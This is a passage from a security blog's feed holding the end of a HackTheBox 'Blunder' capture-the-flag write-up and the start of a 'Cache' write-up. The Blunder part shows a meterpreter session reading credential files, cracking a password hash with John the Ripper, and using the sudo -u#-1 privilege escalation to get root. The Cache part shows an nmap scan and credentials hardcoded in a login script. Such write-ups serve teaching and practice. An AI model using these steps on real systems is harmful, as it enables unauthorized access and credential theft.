&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;As &lt;code&gt;bludit&lt;/code&gt; is a "flat files" CMS every information is stored in PHP file. We
quickly found a &lt;code&gt;users.php&lt;/code&gt; file containing the user information including
password hashes.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;meterpreter &amp;gt; cat ../databases/users.php&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;?php defined(&amp;#39;BLUDIT&amp;#39;) or die(&amp;#39;Bludit CMS.&amp;#39;); ?&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;{&lt;/span&gt;
&lt;span class="code-line"&gt;    &amp;quot;admin&amp;quot;: {&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;nickname&amp;quot;: &amp;quot;Admin&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;firstName&amp;quot;: &amp;quot;Administrator&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;lastName&amp;quot;: &amp;quot;&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;role&amp;quot;: &amp;quot;admin&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;password&amp;quot;: &amp;quot;bfcc887f62e36ea019e3295aafb8a3885966e265&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;salt&amp;quot;: &amp;quot;5dde2887e7aca&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;email&amp;quot;: &amp;quot;&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;registered&amp;quot;: &amp;quot;2019-11-27 07:40:55&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;tokenRemember&amp;quot;: &amp;quot;&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;tokenAuth&amp;quot;: &amp;quot;b380cb62057e9da47afce66b4615107d&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;tokenAuthTTL&amp;quot;: &amp;quot;2009-03-15 14:00&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;twitter&amp;quot;: &amp;quot;&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;facebook&amp;quot;: &amp;quot;&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;instagram&amp;quot;: &amp;quot;&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;codepen&amp;quot;: &amp;quot;&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;linkedin&amp;quot;: &amp;quot;&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;github&amp;quot;: &amp;quot;&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;gitlab&amp;quot;: &amp;quot;&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;    },&lt;/span&gt;
&lt;span class="code-line"&gt;    &amp;quot;fergus&amp;quot;: {&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;firstName&amp;quot;: &amp;quot;&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;lastName&amp;quot;: &amp;quot;&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;nickname&amp;quot;: &amp;quot;&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;description&amp;quot;: &amp;quot;&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;role&amp;quot;: &amp;quot;author&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;password&amp;quot;: &amp;quot;be5e169cdf51bd4c878ae89a0a89de9cc0c9d8c7&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;salt&amp;quot;: &amp;quot;jqxpjfnv&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;email&amp;quot;: &amp;quot;&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;registered&amp;quot;: &amp;quot;2019-11-27 13:26:44&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;tokenRemember&amp;quot;: &amp;quot;&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;tokenAuth&amp;quot;: &amp;quot;0e8011811356c0c5bd2211cba8c50471&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;tokenAuthTTL&amp;quot;: &amp;quot;2009-03-15 14:00&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;twitter&amp;quot;: &amp;quot;&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;facebook&amp;quot;: &amp;quot;&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;codepen&amp;quot;: &amp;quot;&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;instagram&amp;quot;: &amp;quot;&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;github&amp;quot;: &amp;quot;&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;gitlab&amp;quot;: &amp;quot;&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;linkedin&amp;quot;: &amp;quot;&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;mastodon&amp;quot;: &amp;quot;&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;    }&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Looking at &lt;a href="https://github.com/bludit/bludit/blob/master/bl-kernel/users.class.php#L155"&gt;the code&lt;/a&gt;
we quickly found that the hash algorithm is SHA1 with salt.&lt;/p&gt;
&lt;p&gt;Looking more at the code we found another bludit folder with a newer version.
This time the &lt;code&gt;users.php&lt;/code&gt; file contain a password without salt for the &lt;code&gt;hugo&lt;/code&gt;
user.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;meterpreter &amp;gt; getwd&lt;/span&gt;
&lt;span class="code-line"&gt;/var/www/bludit-3.9.2/bl-content&lt;/span&gt;
&lt;span class="code-line"&gt;meterpreter &amp;gt; cd ../../&lt;/span&gt;
&lt;span class="code-line"&gt;meterpreter &amp;gt; ls&lt;/span&gt;
&lt;span class="code-line"&gt;Listing: /var/www&lt;/span&gt;
&lt;span class="code-line"&gt;=================&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Mode             Size  Type  Last modified              Name&lt;/span&gt;
&lt;span class="code-line"&gt;----             ----  ----  -------------              ----&lt;/span&gt;
&lt;span class="code-line"&gt;40755/rwxr-xr-x  4096  dir   2020-05-19 10:13:22 -0400  bludit-3.10.0a&lt;/span&gt;
&lt;span class="code-line"&gt;40775/rwxrwxr-x  4096  dir   2020-04-28 07:18:03 -0400  bludit-3.9.2&lt;/span&gt;
&lt;span class="code-line"&gt;40755/rwxr-xr-x  4096  dir   2019-11-28 04:34:02 -0500  html&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;meterpreter &amp;gt; cd bludit-3.10.0a&lt;/span&gt;
&lt;span class="code-line"&gt;meterpreter &amp;gt; ls&lt;/span&gt;
&lt;span class="code-line"&gt;Listing: /var/www/bludit-3.10.0a&lt;/span&gt;
&lt;span class="code-line"&gt;================================&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Mode              Size   Type  Last modified              Name&lt;/span&gt;
&lt;span class="code-line"&gt;----              ----   ----  -------------              ----&lt;/span&gt;
&lt;span class="code-line"&gt;40755/rwxr-xr-x   4096   dir   2019-10-19 04:10:46 -0400  .github&lt;/span&gt;
&lt;span class="code-line"&gt;100644/rw-r--r--  582    fil   2019-10-19 04:10:46 -0400  .gitignore&lt;/span&gt;
&lt;span class="code-line"&gt;100644/rw-r--r--  395    fil   2019-10-19 04:10:46 -0400  .htaccess&lt;/span&gt;
&lt;span class="code-line"&gt;100644/rw-r--r--  1083   fil   2019-10-19 04:10:46 -0400  LICENSE&lt;/span&gt;
&lt;span class="code-line"&gt;100644/rw-r--r--  2893   fil   2019-10-19 04:10:46 -0400  README.md&lt;/span&gt;
&lt;span class="code-line"&gt;40755/rwxr-xr-x   4096   dir   2020-05-19 05:03:34 -0400  bl-content&lt;/span&gt;
&lt;span class="code-line"&gt;40755/rwxr-xr-x   4096   dir   2019-10-19 04:10:46 -0400  bl-kernel&lt;/span&gt;
&lt;span class="code-line"&gt;40755/rwxr-xr-x   4096   dir   2019-10-19 04:10:46 -0400  bl-languages&lt;/span&gt;
&lt;span class="code-line"&gt;40755/rwxr-xr-x   4096   dir   2019-10-19 04:10:46 -0400  bl-plugins&lt;/span&gt;
&lt;span class="code-line"&gt;40755/rwxr-xr-x   4096   dir   2019-10-19 04:10:46 -0400  bl-themes&lt;/span&gt;
&lt;span class="code-line"&gt;100644/rw-r--r--  900    fil   2020-05-19 06:27:40 -0400  index.php&lt;/span&gt;
&lt;span class="code-line"&gt;100644/rw-r--r--  20306  fil   2019-10-19 04:10:46 -0400  install.php&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;meterpreter &amp;gt; cd bl-content&lt;/span&gt;
&lt;span class="code-line"&gt;meterpreter &amp;gt; ls&lt;/span&gt;
&lt;span class="code-line"&gt;Listing: /var/www/bludit-3.10.0a/bl-content&lt;/span&gt;
&lt;span class="code-line"&gt;===========================================&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Mode             Size  Type  Last modified              Name&lt;/span&gt;
&lt;span class="code-line"&gt;----             ----  ----  -------------              ----&lt;/span&gt;
&lt;span class="code-line"&gt;40755/rwxr-xr-x  4096  dir   2020-05-19 05:10:14 -0400  databases&lt;/span&gt;
&lt;span class="code-line"&gt;40755/rwxr-xr-x  4096  dir   2020-05-19 05:03:34 -0400  pages&lt;/span&gt;
&lt;span class="code-line"&gt;40755/rwxr-xr-x  4096  dir   2020-05-19 05:03:34 -0400  tmp&lt;/span&gt;
&lt;span class="code-line"&gt;40755/rwxr-xr-x  4096  dir   2020-05-19 05:03:34 -0400  uploads&lt;/span&gt;
&lt;span class="code-line"&gt;40755/rwxr-xr-x  4096  dir   2020-05-19 05:03:34 -0400  workspaces&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;meterpreter &amp;gt; cat databases/users.php&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;?php defined(&amp;#39;BLUDIT&amp;#39;) or die(&amp;#39;Bludit CMS.&amp;#39;); ?&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;{&lt;/span&gt;
&lt;span class="code-line"&gt;    &amp;quot;admin&amp;quot;: {&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;nickname&amp;quot;: &amp;quot;Hugo&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;firstName&amp;quot;: &amp;quot;Hugo&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;lastName&amp;quot;: &amp;quot;&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;role&amp;quot;: &amp;quot;User&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;password&amp;quot;: &amp;quot;faca404fd5c0a31cf1897b823c695c85cffeb98d&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;email&amp;quot;: &amp;quot;&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;registered&amp;quot;: &amp;quot;2019-11-27 07:40:55&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;tokenRemember&amp;quot;: &amp;quot;&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;tokenAuth&amp;quot;: &amp;quot;b380cb62057e9da47afce66b4615107d&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;tokenAuthTTL&amp;quot;: &amp;quot;2009-03-15 14:00&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;twitter&amp;quot;: &amp;quot;&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;facebook&amp;quot;: &amp;quot;&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;instagram&amp;quot;: &amp;quot;&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;codepen&amp;quot;: &amp;quot;&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;linkedin&amp;quot;: &amp;quot;&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;github&amp;quot;: &amp;quot;&amp;quot;,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;quot;gitlab&amp;quot;: &amp;quot;&amp;quot;}&lt;/span&gt;
&lt;span class="code-line"&gt;}&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We put the hash in a local file and run john the ripper on it with the &lt;code&gt;rockyou&lt;/code&gt;
dictionary. The come up empty. So we had the &lt;code&gt;--rules&lt;/code&gt; option to add a few rules
to our dictionary. The password &lt;code&gt;Password120&lt;/code&gt; is quickly found.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$john haash -w=tools/password_lists/rockyou.txt --rules&lt;/span&gt;
&lt;span class="code-line"&gt;Warning: detected hash type &amp;quot;Raw-SHA1&amp;quot;, but the string is also recognized as &amp;quot;Raw-SHA1-AxCrypt&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;Loaded 1 password hash (Raw-SHA1 [SHA1 128/128 AVX 4x])&lt;/span&gt;
&lt;span class="code-line"&gt;Warning: no OpenMP support for this hash type, consider --fork=8&lt;/span&gt;
&lt;span class="code-line"&gt;Press &amp;#39;q&amp;#39; or Ctrl-C to abort, almost any other key for status&lt;/span&gt;
&lt;span class="code-line"&gt;Password120      (hugo)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We can now us &lt;code&gt;su&lt;/code&gt; to switch user to &lt;code&gt;hugo&lt;/code&gt; and get the user flag but first of all we need an
interactive shell.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;python3 -c &amp;#39;import pty; pty.spawn(&amp;quot;/bin/sh&amp;quot;)&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;$ su hugo&lt;/span&gt;
&lt;span class="code-line"&gt;su hugo&lt;/span&gt;
&lt;span class="code-line"&gt;Password: Password120&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;id&lt;/span&gt;
&lt;span class="code-line"&gt;hugo@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ id&lt;/span&gt;
&lt;span class="code-line"&gt;uid=1001(hugo) gid=1001(hugo) groups=1001(hugo)&lt;/span&gt;
&lt;span class="code-line"&gt;hugo@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ cd&lt;/span&gt;
&lt;span class="code-line"&gt;cd&lt;/span&gt;
&lt;span class="code-line"&gt;hugo@blunder:~$ cat user.txt&lt;/span&gt;
&lt;span class="code-line"&gt;cat user.txt&lt;/span&gt;
&lt;span class="code-line"&gt;2fc521288709e7da0e7119128831b13c&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="root"&gt;Root&lt;/h1&gt;
&lt;p&gt;We list our &lt;code&gt;sudo&lt;/code&gt; privileges and found that we can run &lt;code&gt;/bin/bash&lt;/code&gt; as every
user except &lt;code&gt;root&lt;/code&gt;. This a &lt;a href="https://resources.whitesourcesoftware.com/blog-whitesource/new-vulnerability-in-sudo-cve-2019-14287"&gt;"recent" sudo vulnerability&lt;/a&gt;
and we just need to use the &lt;code&gt;-u#-1&lt;/code&gt; parameter to get a &lt;code&gt;root&lt;/code&gt; shell and get the flag.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;hugo@blunder:~$ sudo -l&lt;/span&gt;
&lt;span class="code-line"&gt;sudo -l&lt;/span&gt;
&lt;span class="code-line"&gt;Password: Password120&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Matching Defaults entries for hugo on blunder:&lt;/span&gt;
&lt;span class="code-line"&gt;    env_reset, mail_badpass,&lt;/span&gt;
&lt;span class="code-line"&gt;    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;User hugo may run the following commands on blunder:&lt;/span&gt;
&lt;span class="code-line"&gt;    (ALL, !root) /bin/bash&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;hugo@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ sudo -u#-1 /bin/bash&lt;/span&gt;
&lt;span class="code-line"&gt;sudo -u#-1 /bin/bash&lt;/span&gt;
&lt;span class="code-line"&gt;Password: Password120&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;root@blunder:/# cd /root/&lt;/span&gt;
&lt;span class="code-line"&gt;cd /root/&lt;/span&gt;
&lt;span class="code-line"&gt;root@blunder:/root# cat root.txt&lt;/span&gt;
&lt;span class="code-line"&gt;cat root.txt&lt;/span&gt;
&lt;span class="code-line"&gt;01efa72b77e36192eda3c5a08a9ba4a8&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;
&lt;p&gt;For an easy box this was easy. I was wondering when the &lt;code&gt;sudo&lt;/code&gt; vulnerability
will appear on HTB.&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="linux"></category><category term="cewl"></category><category term="bludit"></category><category term="sudo"></category></entry><entry><title>HTB: Cache</title><link href="https://maggick.fr/2020/10/htb-cache.html" rel="alternate"></link><published>2020-10-10T18:05:00+02:00</published><updated>2020-10-10T18:05:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-10-10:/2020/10/htb-cache.html</id><summary type="html">&lt;p&gt;&lt;img alt="Cache card" class="align-left" src="/media/2020.10/cache_card.png" width="262"/&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/251"&gt;Cache&lt;/a&gt; created by
&lt;a href="https://www.hackthebox.eu/home/users/profile/23227"&gt;ASHacker&lt;/a&gt; and publish on
May 9, 2020.
This box is classified as a medium machine. The user part is the harder as it
involve some enumeration, chaining two exploit for
&lt;a href="https://www.open-emr.org/"&gt;openEMR&lt;/a&gt;. The root part is
quit easier as it was a simple "exploitation" the box's &lt;code&gt;memcache&lt;/code&gt; and the
docker permissions.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2020.10/cache_card.png" alt="Cache card" width="262"&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/251"&gt;Cache&lt;/a&gt; created by
&lt;a href="https://www.hackthebox.eu/home/users/profile/23227"&gt;ASHacker&lt;/a&gt; and publish on
May 9, 2020.
This box is classified as a medium machine. The user part is the harder as it
involve some enumeration, chaining two exploit for
&lt;a href="https://www.open-emr.org/"&gt;openEMR&lt;/a&gt;. The root part is
quit easier as it was a simple "exploitation" the box's &lt;code&gt;memcache&lt;/code&gt; and the
docker permissions.&lt;/p&gt;


&lt;h1 id="user"&gt;User&lt;/h1&gt;
&lt;h2 id="recon"&gt;Recon&lt;/h2&gt;
&lt;p&gt;We start with an nmap scan. Only port 22 (SSH) and 80 (HTTP) are open.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.80 scan initiated Sat May 16 03:28:10 2020 as: nmap -p- -sSV -oN nmap 10.10.10.188&lt;/span&gt;
&lt;span class="code-line"&gt;Nmap scan report for 10.10.10.188&lt;/span&gt;
&lt;span class="code-line"&gt;Host is up (0.013s latency).&lt;/span&gt;
&lt;span class="code-line"&gt;Not shown: 65533 closed ports&lt;/span&gt;
&lt;span class="code-line"&gt;PORT   STATE SERVICE VERSION&lt;/span&gt;
&lt;span class="code-line"&gt;22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)&lt;/span&gt;
&lt;span class="code-line"&gt;80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))&lt;/span&gt;
&lt;span class="code-line"&gt;Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&lt;/span&gt;
&lt;span class="code-line"&gt;# Nmap done at Sat May 16 03:37:19 2020 -- 1 IP address (1 host up) scanned in 549.65 seconds&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="web"&gt;Web&lt;/h2&gt;
&lt;p&gt;We look at the website. The homepage is describing the different type of hacker
(&lt;em&gt;sic&lt;/em&gt;) (red hats really?).&lt;/p&gt;
&lt;p&gt;&lt;img alt="Cache home page" src="/media/2020.10/cache_01.png"&gt;&lt;/p&gt;
&lt;p&gt;There is a login page.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Cache login page" src="/media/2020.10/cache_02.png"&gt;&lt;/p&gt;
&lt;p&gt;When we try to login we see in Burp that there is no request sent.
We look at the JavaScript files loaded by the page and mostly at the file
&lt;code&gt;functionality.js&lt;/code&gt; located at &lt;code&gt;http://cache.htb/jquery/functionality.js&lt;/code&gt;. The
file contain the credentials for the login form: &lt;code&gt;ash:H@v3_fun&lt;/code&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nx"&gt;$&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;(){&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="kd"&gt;var&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;error_correctPassword&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kc"&gt;false&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="kd"&gt;var&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;error_username&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kc"&gt;false&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;checkCorrectPassword&lt;/span&gt;&lt;span class="p"&gt;(){&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="kd"&gt;var&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;Password&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;$&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;#password&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="nx"&gt;val&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;Password&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;!=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;H@v3_fun&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="nx"&gt;alert&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Password didn&amp;#39;t Match&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="nx"&gt;error_correctPassword&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;checkCorrectUsername&lt;/span&gt;&lt;span class="p"&gt;(){&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="kd"&gt;var&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;Username&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;$&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;#username&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="nx"&gt;val&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;Username&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;!=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;ash&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
